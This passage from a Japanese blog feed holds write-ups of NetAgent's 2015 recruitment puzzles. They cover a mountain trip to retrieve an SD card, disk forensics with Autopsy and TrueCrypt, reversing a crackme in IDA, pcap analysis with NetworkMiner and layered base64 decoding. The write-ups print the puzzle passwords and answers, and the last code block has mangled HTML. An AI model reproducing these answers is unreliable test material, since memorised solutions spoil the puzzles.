<blockquote class="twitter-tweet" lang="ja"><p>あっやばい霞ががってきた <a href="http://t.co/BK7zs4m0L1">pic.twitter.com/BK7zs4m0L1</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584976787811119105">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雲のなかにいる <a href="http://t.co/5KVkzmPEp8">pic.twitter.com/5KVkzmPEp8</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584980779408556033">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雨も降ってきたし10m先見えないし怖い <a href="http://t.co/9mq61pmxK3">pic.twitter.com/9mq61pmxK3</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584987757157617664">2015, 4月 6</a></blockquote>


<p>雨も降ってきて、このままバスが来なかったらどうしようといった不安から、すこし怖くなりました。</p>

<p>バス到着予定時刻になり、赤城山ビジターセンターバス停で待っていると定刻通りにバスがきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>帰りのバス乗った！！！ これで少なくとも下山できる！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584993731985551360">2015, 4月 6</a></blockquote>


<p>帰りのバスにも乗れ、あとは電車に乗って終電までに帰ることができれば、SDカードの捜索は無事終了となります。</p>

<p>しかしわざわざ群馬県まで来たからには、なにか群馬らしいことをして帰りたいなと思いました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>なぜかグンマーにいるのでGunmaっぽい夕食食べて帰ろうかな</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585002417697099777">2015, 4月 6</a></blockquote>


<p>群馬の名産が何があるか知らなかったので有識者に聞いてみたところ、luminさんからアドバイスをいただきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 焼きまんじゅう、ひもかわうどん（桐生）</p>&mdash; lumin (@lumin) <a href="https://twitter.com/lumin/status/585006039528972288">2015, 4月 6</a></blockquote>


<p><strong>あっ！！！</strong>
hint3.txtに記載のあったひもかわうどんをすっかり忘れてました！</p>

<p>前橋駅に着き、帰路の途中の駅である高崎駅付近のうどん屋さんへと向かうことを決めました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>駅ついたー 命があるぞー <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅 (Maebashi Sta.) in 前橋市, 群馬県) <a href="https://t.co/8530G2c0RA">https://t.co/8530G2c0RA</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585014590695669760">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>mondai解いた時にあったひもかわうどんを食しに行かねば <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585015639519006720">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>よし、高崎のひもかわうどん屋へGo <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585017858687545344">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>食うぜひもかわうどん <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 高崎駅 (Takasaki Sta.) in 高崎市, 群馬県) <a href="https://t.co/tygSOrl8kj">https://t.co/tygSOrl8kj</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585022094821457920">2015, 4月 6</a></blockquote>


<p>高崎駅に到着した直後にまたも雨に降られてしまいましたが、20分ほどかけてひもかわうどんを扱ううどん屋さんへと歩きました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ひもかわうどん！！ (@ めんいち in 高崎市, 群馬県) <a href="https://t.co/0C5suZrS3F">https://t.co/0C5suZrS3F</a> <a href="http://t.co/4D65OYc4G3">pic.twitter.com/4D65OYc4G3</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585027483772289026">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>hint3.txt kanto1 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/ATgu9JllWm">pic.twitter.com/ATgu9JllWm</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585029832964091904">2015, 4月 6</a></blockquote>


<p>名古屋県民の舌にはきしめんを思い出させる食感で、とてもなつかしい気分になりました。</p>

<p>さあ、これで群馬県に思い残すことはありません。
行きで使わなかった学割証を使って高崎駅からJRで南流山まで行き、そこからつくばエクスプレスに乗ってつくば駅に向かって、SDカードの捜索は終了となります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>さらば群馬県 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 高崎駅 (Takasaki Sta.) in 高崎市, 群馬県) <a href="https://t.co/gWMQTyhwoC">https://t.co/gWMQTyhwoC</a> <a href="http://t.co/zZ4UY6GnbL">pic.twitter.com/zZ4UY6GnbL</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585037725440565248">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>帰路のJR乗った <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585040578011762688">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>帰路の電車で原因不明の停止信号受信でパンダグラフ下ろしたそうで電車内真っ暗とかもう、もう <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585043902886846464">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>我が家に帰ってきたような安心感 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくば駅 (Tsukuba Sta.) in つくば市, 茨城県) <a href="https://t.co/1RrtayjBUG">https://t.co/1RrtayjBUG</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585085754847719425">2015, 4月 6</a></blockquote>


<h2>費用</h2>

<p>SDカードがあった現地まで出向きたいという方のために、参考までにつくば駅から血の池までの往復でかかった運賃を記しておきます。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">区間          </th>
<th style="text-align:center;"> 種別  </th>
<th style="text-align:right;"> 運賃</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">つくば→流山おおたかの森 </td>
<td style="text-align:center;"> つくばエクスプレス </td>
<td style="text-align:right;"> 720</td>
</tr>
<tr>
<td style="text-align:center;">流山おおたかの森→足利市 </td>
<td style="text-align:center;"> 東武鉄道 </td>
<td style="text-align:right;"> 885</td>
</tr>
<tr>
<td style="text-align:center;">足利市→足利 </td>
<td style="text-align:center;"> 徒歩 </td>
<td style="text-align:right;"> 0</td>
</tr>
<tr>
<td style="text-align:center;">足利→前橋 </td>
<td style="text-align:center;"> JR </td>
<td style="text-align:right;"> 756</td>
</tr>
<tr>
<td style="text-align:center;">前橋駅→富士見温泉 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 600</td>
</tr>
<tr>
<td style="text-align:center;">富士見温泉→赤城山大洞</td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 1200</td>
</tr>
<tr>
<td style="text-align:center;">赤城山ビジターセンター→富士見温泉 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 1200</td>
</tr>
<tr>
<td style="text-align:center;">富士見温泉→前橋駅 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 600</td>
</tr>
<tr>
<td style="text-align:center;">前橋→高崎 </td>
<td style="text-align:center;"> JR </td>
<td style="text-align:right;"> 195</td>
</tr>
<tr>
<td style="text-align:center;">高崎→南流山 </td>
<td style="text-align:center;"> JR(学割) </td>
<td style="text-align:right;"> 1550</td>
</tr>
<tr>
<td style="text-align:center;">南流山→つくば</td>
<td style="text-align:center;"> つくばエクスプレス </td>
<td style="text-align:right;"> 822</td>
</tr>
</tbody>
</table>


<p>計8,528円でした。所要時間は、9:24につくば駅発の電車に乗って23:24につくば駅に戻ってくることから、
ギリギリの行程で行く場合は、14時間ほどかかる（＝ほぼ丸一日）ということになります。</p>

<h2>SDカードのmondai</h2>

<p>SDカードを手に入れておしまいではありません。SDカードの中にあるmondai10.tcを開かないことには最終面接へ挑むことができません。
とりあえずAutopsyにSDカードを読ませてみます。</p>

<p><img src="/blog/resources/images//autopsy-mondai10.png" alt="autopsy-mondai10" /></p>

<p>意外と簡単に問題ファイルが浮上してきました。
削除された0バイトのファイルがあり、そのファイル名は「山名＋最高点の標高を英数字で９文字.txt」となっていました。</p>

<p>登山した赤城山は標高1828mなので、<strong>akagi1828</strong>がmondai10.tcのパスワードだと思われます。</p>

<p>TrueCryptでmondai10.tcを<strong>akagi1828</strong>をパスワードとしてマウントすると、見事イメージをマウントすることができました。</p>

<p><img src="/blog/resources/images//mount-mondai10.png" alt="mount-mondai10" /></p>

<p>マウントしたイメージには何があったでしょうか。</p>

<p><img src="/blog/resources/images//final-mondai.png" alt="final-mondai" /></p>

<pre style="border:none; color:inherit; background-color:inherit;">
＿人人人人人人人＿
＞　答え.txt　＜
￣Y^Y^Y^Y^Y^Y￣
</pre>


<h1>感想</h1>

<p>mondai9までは日々の隙間時間を使い、少々躓きながらもなんとか時間をかけて解くことができました。
しかし、mondai10がここまで大変であるとは思っていませんでした。
同じ関東だからと舐めてかかっていたために、ギリギリの乗り換えや予想外の雪道に遭遇してつらい思いをしました。
しかし、マイナビに登録してエントリーするなどの就職活動をし、一次選考と二次選考を通過して最終面接に挑む方々と比べると、
雪道を這い上がるなど、苦労の量は比較的少ないようにも思えます。
このようなmondaiを通して就職の機会を与えてくれたネットエージェントさんに感謝するばかりです。</p>

<p>いろいろなmondaiに挑むことで、いろいろな答えを見つけるセンスを身につけられたかと思います。
このような問題を見つけることがあれば、みなさん是非とも挑戦して技量を高めてみてください。</p>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<script>
var a = document.querySelectorAll('a[href$=".JPG"]')
for(var i = 0; i < a.length; i++){a[i].target = "_blank"}
</script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その3]]></title>
    <link href="http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9/"/>
    <updated>2015-04-15T00:01:21+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9</id>
    <content type="html"><![CDATA[<p>あのネットエージェントのいきなり最終面接問題を解いたのでWrite-upを書きました。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>これまでのmondaiはLinuxやOS Xがあれば解くことができていましたが、mondai7からはWindowsの実行ファイル形式やMicrosoft Officeドキュメントが登場したりと、そろそろWindowsがない環境には手厳しい問題となってきました。
なので、今回の記事に掲載のmondaiはすべて（<code>file</code>コマンドでのファイル情報調査以外）、Windows上での解法となっております。</p>

<p>昨日の<a href="/blog/2015/04/14/netagent-mondai5-6/">mondai6までの解法</a>に続いて本日はmondai7、mondai8、mondai9の解法を公開します。</p>

<!-- more -->


<h1>mondai7</h1>

<p>mondai7はnormal.exeというWIN/PE32実行ファイルを解析して答えを得る問題のようです。</p>

<pre><code class="sh">$ file normal.exe
normal.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
</code></pre>

<p>今回はIDA Pro(demo)を使って解析してみます。</p>

<p><img src="/blog/resources/images//normal-ida1.png" alt="normal-ida1.png" /></p>

<p>IDAに解析させて表示を見てみると、おもむろに正解を表示するらしい<em>aCorrectKeyIsS</em>がみつかります。
ここまで来る過程をアセンブリ表示で追っていくことにします。</p>

<p><img src="/blog/resources/images//normal-ida2.png" alt="normal-ida2.png" /></p>

<p><em>aCorrectKeyIsS</em>はsprintfで渡されるテンプレート文字列で、そこにコマンドライン引数が埋め込められるようにいなっているようです。
このことから、normal.exeにキー候補の文字列をコマンドライン引数として渡して実行し、なにか判定があり、それが正しい場合に<strong>Correct! KEY is : </strong>に続いてその文字列が表示されるようになっていることがわかります。</p>

<p><img src="/blog/resources/images//normal-ida3.png" alt="normal-ida3.png" /></p>

<p>すこし遡ってみると、キーが表示される部分のサブルーチンへ来る前に、なにやら条件分岐があります。
コマンドライン第一引数の文字長をstrlenでチェックし、0x0A(=10)と比較し、合致しない場合に<strong>Try Again!</strong>と表示する処理がみつかりました。
このことから、キーは10文字長であることがわかります。</p>

<p><img src="/blog/resources/images//normal-ida4.png" alt="normal-ida4.png" /></p>

<p>キーが表示される直前に行われる処理を見てみると、サブルーチン<em>sub_4011C0</em>を呼んだ戻り値が0の場合、<strong>Try Again!</strong>の表示をさせるようになっています。
<em>sub_4011C0</em>にはコマンドライン引数を渡しているので、この引数が何か特定の文字列と比較されていると推測できます。</p>

<p><img src="/blog/resources/images//normal-ida5.png" alt="normal-ida5.png" /></p>

<p>サブルーチン<em>sub_4011C0</em>のはじめの方では、ループインデックス（以下、i）を0にしたりと、forループの初期化が行われている様子がつかめます。このループの中の処理を見てみます。</p>

<p><img src="/blog/resources/images//normal-ida6.png" alt="normal-ida6.png" /></p>

<p>このforループでは、iが0x0A(=10)になるまでループが回れば1を、途中でbreakが発生すれば0をサブルーチン呼び出し元に返すような処理をしています。
途中でbreakが発生する条件は、ループ内で呼ばれる<em>sub_401170</em>の戻り値と謎の配列<em>dword_40C068</em>の比較が偽である場合となっています。
要するに、このループがi=10になるまで回らないと呼び出し元に0が返され、<strong>Try Again!</strong>が表示されるということです。</p>

<p>コマンドライン引数のi番目の文字が引数として渡されて呼び出されている<em>sub_401170</em>を見てみます。</p>

<p><img src="/blog/resources/images//normal-ida7.png" alt="normal-ida7.png" /></p>

<p><em>sub_401170</em>はサブルーチンの引数で与えられた文字（＝コマンドライン引数のi番目の文字）が、謎の文字列<strong>&#8220;efyTUwxqrY&#8230;&#8221;</strong>の中の何番目に出てくるかを、forループを回して一つずつチェックしているようです。そしてサブルーチンの戻り値として、謎の文字列の何番目に引数の文字が現れたかを呼び出し元に返しています。</p>

<p><img src="/blog/resources/images//normal-ida8.png" alt="normal-ida8.png" /></p>

<p>謎の配列<em>dword_40C068</em>の中身を見に行くと、unsignled long型の配列として、数値が格納されていました。
先のサブルーチン<em>sub_4011C0</em>のループ内では、コマンドライン引数のi番目の文字を<em>sub_401170</em>に渡し、謎の文字列の何番目に出現するかを取得し、その値とこの<em>dword_40C068</em>のi番目の数値を比較して、同じであればループを継続するという処理でした。</p>

<p>ここまでの調査を基にまとめると、このプログラムの処理は簡易的に以下のようになっていることがわかります。</p>

<ul>
<li>コマンドライン引数に与えられた文字列があり、</li>
<li>その文字列は10文字であり、</li>
<li>その文字列の1文字1文字が謎の文字列<strong>&#8220;efyTUwxqrY&#8230;&#8221;</strong>の何番目に位置するかを調べていて、</li>
<li>その位置がすべて謎の配列<em>dword_40C068</em>に定義されたもの同じであれば<strong>Correct! Key is :</strong>に続けて引数を表示する</li>
</ul>


<p>なので逆に考えると、謎の文字列の中の、謎の配列に定義されている場所の文字を抽出すればキーが見つかるということです。
パパッと以下のようなものを書いてキーを抽出します。</p>

<pre><code class="ruby">#!/usr/bin/env ruby

string = "efyTUwxqrYHEFmduCJAXQpgKLBnhiltINPGOoszkMDvcjabSZRVW"
indexes = [0x03, 0x24, 0x2b, 0x1b, 0x0f, 0x17, 0x2d, 0x25, 0x24, 0x0f]

key = ""

for i in indexes do
    key += string[i]
end

p key
</code></pre>

<!--
$ ruby mondai7.rb
"TochuKasou"
-->


<p>試しにnormal.exeの引数に、このコードを実行して得られたキーを与えて実行してみたところ、以下のようになりました。</p>

<p><img src="/blog/resources/images//TochuKasou.png" alt="TochuKasou.png" /></p>

<p>この文字列を与えてmondai8.zipを解凍してmondai7は終了です。</p>

<pre><code class="sh">&gt; 7z.exe x mondai8.zip

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai8.zip

Extracting  mondai8.tc
Enter password (will not be echoed):

Extracting  mondai8.txt
Extracting  mondai9.zip

Everything is Ok

Files: 3
Size:       70339136
Compressed: 70339594

Kernel  Time =     0.015 =    0%
User    Time =     1.170 =   21%
Process Time =     1.185 =   22%    Virtual  Memory =      2 MB
Global  Time =     5.379 =  100%    Physical Memory =      4 MB
</code></pre>

<!--
$ wine 7z x mondai8.zip -pTochuKasou

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai8.zip

Extracting  mondai8.tc
Extracting  mondai8.txt
Extracting  mondai9.zip

Everything is Ok

Files: 3
Size:       70339136
Compressed: 70339594
-->


<h1>mondai8</h1>

<p>なにやら怪しげなファイルmondai8.tcと問題文mondai8.txtがあります。mondai8.txtには以下のような記述がありました。
<code>
TrueCrypt pass:mondai8
漢字８文字
</code></p>

<p>mondai8.tcはTrueCryptファイルで、開くためのパスワードはmondai8であるとのことです。そしてこのmondai8の答えは漢字8文字ということでしょう。
TrueCryptでmondai8.tcをマウントして中を見てみました。</p>

<p><img src="/blog/resources/images//mondai8-files.png" alt="mondai8-files.png" /></p>

<p>こういったCTF系の問題でイメージファイルが配布されるときは、フォレンジック問題であると相場が決まっているので、TrueCryptでマウントしたらAutopsyで調査します。</p>

<p><img src="/blog/resources/images//autopsy.png" alt="autopsy.png" /></p>

<p>マウントした際に表示されていたファイルになかった「今日の本.xlsx」という削除されたファイルが見つかりました。怪しいですね。
復元してファイルを開いてみます。</p>

<p><img src="/blog/resources/images//todaysbook1.png" alt="todaysbook1.png" />
<img src="/blog/resources/images//todaysbook2.png" alt="todaysbook2.png" />
<img src="/blog/resources/images//todaysbook3.png" alt="todaysbook3.png" /></p>

<p>シート1にはアルファベットと2つの数字が書かれた行があり、シート2には、<a href="http://www.aozora.gr.jp/cards/001670/card56113.html">青空文庫の奇談クラブ</a>からコピーされたであろう本の内容が書かれていました。</p>

<p>シート3には、key:passwordに対応するanswerを入力するような空欄がありました。
このpasswordという文字列はきっとシート1のアルファベットと2つの数字に対応していて、1つ目の数字は行番号、2つ目の数字はその行の文字の位置を指しているだろうと思いました。
Excel Onlineの印刷機能でシート2をHTML形式にし、保存したのちテキストに変換して<a href="/blog/resources/data/2015/04/15/kidanclub.txt">kidanclub.txt</a>を作成し、
シート1を基に、アルファベット<strong>&#8220;password&#8221;</strong>に対応する行から文字を抽出するコードを書きました。</p>

<p><img src="/blog/resources/images//print-book.png" alt="print-book.png" /></p>

<pre><code class="ruby">#!/usr/bin/env ruby
password = [
    [119,161], # p
    [ 62, 11], # a
    [276, 40], # s
    [276, 40], # s
    [ 18, 58], # w
    [239, 44], # o
    [236,  7], # r
    [185,  7]  # d
]

book = File.open(ARGV[0], "r").readlines
key = ""
for i in password do
    # One-based numbering
    key += book[i[0] - 1][i[1] - 1]
end

p key
</code></pre>

<p>引数に先ほど作成した<a href="/blog/resources/data/2015/04/15/kidanclub.txt">kidanclub.txt</a>を与えて実行してみると、漢字8文字のパスワードを得ることができました。</p>

<!--
$ ruby mondai8.rb kidanclub.txt
"意気揚揚明鏡止水"
-->


<p>mondai5同様、非ASCII文字のパスワードなので、<code>7z.exe</code>を利用してmondai9.zipを解凍しておしまいです。</p>

<pre><code class="sh">&gt; 7z.exe x mondai9.zip

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai9.zip

Extracting  mondai10.tc
Enter password (will not be echoed):

Extracting  mondai9.pkt

Everything is Ok

Files: 2
Size:       68517107
Compressed: 68241943

Kernel  Time =     0.046 =    1%
User    Time =     0.733 =   16%
Process Time =     0.780 =   17%    Virtual  Memory =      2 MB
Global  Time =     4.536 =  100%    Physical Memory =      4 MB
</code></pre>

<!--
$ wine 7z.exe x mondai9.zip -p意気揚揚明鏡止水

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai9.zip

Extracting  mondai10.tc
Extracting  mondai9.pkt

Everything is Ok

Files: 2
Size:       68517107
Compressed: 68241943

Kernel  Time =     0.046 =    5%
User    Time =     0.733 =   87%
Process Time =     0.780 =   93%    Virtual  Memory =      2 MB
Global  Time =     0.836 =  100%    Physical Memory =      4 MB
-->


<h1>mondai9</h1>

<p>mondai9.pktは<code>file</code>コマンドによると、little-endianなpcapファイルのようです。</p>

<pre><code>$ file mondai9.pkt
mondai9.pkt: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
</code></pre>

<p>また、拡張子pktはWindowsの関連付けでは、Wiresharkで開けるファイルとなっています。
早速Wiresharkで見てみます。</p>

<p><img src="/blog/resources/images//mondai9-wireshark1.png" alt="mondai9-wireshark1.png" /></p>

<p>ざっと目を通した感じ、<code>tcpdump -f 'tcp port 80'</code>によって、fast-uploader.comにアクセスしている様子をキャプチャしたもののようです。</p>

<p><img src="/blog/resources/images//mondai9-wireshark2.png" alt="mondai9-wireshark2.png" /></p>

<p>httpリクエストで絞り込むと、POSTメソッドによってファイルを幾つかアップロードしているようです。</p>

<p><img src="/blog/resources/images//mondai9-wireshark3.png" alt="mondai9-wireshark3.png" /></p>

<p>アップロードしたファイルを抽出しようとメニューのHTTP objectから抽出を試みたのですが、Wiresharkでは<em>multipart/form-data</em>としてPOSTされたデータ中のファイルはうまく取り出せないようなので、NetworkMinerを使います。</p>

<p><img src="/blog/resources/images//mondai9-networkminer.png" alt="mondai9-networkminer.png" /></p>

<p>NetworkMinerで4つのアップロードされたファイルを抽出したところ、文字化けした2つのExcelファイルと1つのWordファイル、パスワードのかかったzipファイルがありました。
パスワードをクラックするとWordファイルが出てきたので、4つのOfficeファイルを開いてみました。</p>

<p><img src="/blog/resources/images//office-files.png" alt="office-files.png" /></p>

<p>どのOfficeファイルにも文字の記入はなく、答えらしきものがみつかりません。
ファイル名で検索してみたりいろいろしたあと、ファイルのメタ情報を詮索してみることにしたところ、文字化けしたWordファイルにそれらしきものがあることに気づきました。</p>

<p><img src="/blog/resources/images//word-property.png" alt="word-property.png" /></p>

<p>これパスワードとしてmondai10.tcをTrueCryptでマウントしてみたところ、開くことができました。</p>

<p>明日は最終問題、mondai10のWrite-upを公開します。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その2]]></title>
    <link href="http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6/"/>
    <updated>2015-04-14T00:05:14+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6</id>
    <content type="html"><![CDATA[<p>ネットニュースサイトにも取り上げられ、盛り上がりを見せていたネットエージェントのいきなり最終面接mondaiのWrite-upその2です。</p>

<ul>
<li><a href="http://nlab.itmedia.co.jp/nl/articles/1503/30/news143.html">「解けたらいきなり最終面接」 ネットエージェント、今年も新卒向けに“難問”出題 - ねとらぼ</a></li>
</ul>


<p>某所ではこれらのmondaiを10分で解けたとの声が上がっているようで、世の中にはこの記事とは比べ物にならないくらい効率のよい解き方をしている方がいるようです。それらの解法と比べると、この記事の解法は全部解くのに数日かかっているので、内容が無いも同然という位置付けとなります。
もし10分で解いた猛者たちの解法が公開されていたら、この記事ではなくそちらをご覧になることをお勧めします。</p>

<p>昨日の<a href="/blog/2015/04/13/netagent-mondai1-4/">mondai1からmondai4までのWrite-upの記事</a>に続き、今日はmondai5とmondai6のWrite-upを公開します。</p>

<!-- more -->


<h1>mondai5</h1>

<p>mondai4.zipを解凍した際に出てきたファイル、mondai5は何だろうかと<code>file</code>コマンドを用いて調べると、ASCII textであるらしいことがわかります。テキストエディタで開いてみると、各行76文字で折り返されている、長いBASE64エンコードされた文字列が記載されていました。
そのまま<code>base64</code>に食べさせてデコードします。
<code>sh
$ base64 -D mondai5 -o mondai5-1
</code></p>

<p>デコードしてできたmondai5-1を<code>file</code>コマンドで調べてみるとまたもASCII textで、内容も先ほどと同じように、各行76文字で折り返されたBASE64エンコード文字列が書かれています。
同じように<code>base64</code>でデコードしてmondai5-2を作成します。</p>

<p>作成したmondai5-2を調べると、なんとmondai5、mondai5-1と同じ形で、またもBASE64エンコード文字列が書かれてるASCII textでした。
これもまた<code>base64</code>でデコードしてmondai5-3を作成します。
できあがった<strong>mondai5-3も同じ形式</strong>なので、同様の手順でmondai5-4を作成します。</p>

<p>mondai5-4は<code>file</code>コマンドで調べると、以下のように返してきます。
<code>sh
$ file mondai5-4
mondai5-4: uuencoded or xxencoded text
</code></p>

<p>uuencodeされた文字列が格納されているようです。
<code>uudecode</code>コマンドでmondai5-5を作成します。</p>

<pre><code class="sh">$ uudecode -o mondai5-5 mondai5-4
</code></pre>

<p>mondai5-5を調べてみるとgzip圧縮ファイルだということがわかります。
<code>sh
$ file mondai5-5
mondai5-5: gzip compressed data, from Unix, last modified: Thu Mar 19 17:31:56 2015
</code></p>

<p><code>gunzip</code>で解凍してmondai5-6を作成します。</p>

<pre><code class="sh">$ gunzip -d mondai5-5 -c &gt; mondai5-6
</code></pre>

<p>mondai5-6を調査してみましょう。<code>file</code>コマンドによるとzip圧縮ファイルとのことなので、中身を調べてみます。
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-6
</span><span class='line'>mondai5-6: Zip archive data, at least v1.0 to extract
</span><span class='line'><span class="nv">$ </span>7z l mondai5-6
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Listing archive: mondai5-6&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;--
</span><span class='line'><span class="nv">Path</span> <span class="o">=</span> mondai5-6
</span><span class='line'><span class="nv">Type</span> <span class="o">=</span> zip
</span><span class='line'>Physical <span class="nv">Size</span> <span class="o">=</span> 1472&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Date      Time    Attr         Size   Compressed  Name&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;2015-03-18 18:50:16 ....A         <span class="m">1332</span>         <span class="m">1332</span>  nek&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;                              <span class="m">1332</span>         <span class="m">1332</span>  <span class="m">1</span> files, <span class="m">0</span> folders
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;
</span><span class='line'>nekというファイルが格納されているようです。<span class="sb">`</span>7z<span class="sb">`</span>コマンドで解凍してnekを取り出します。
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>7z x mondai5-6&lt;/p&gt;
</span><span class='line'>
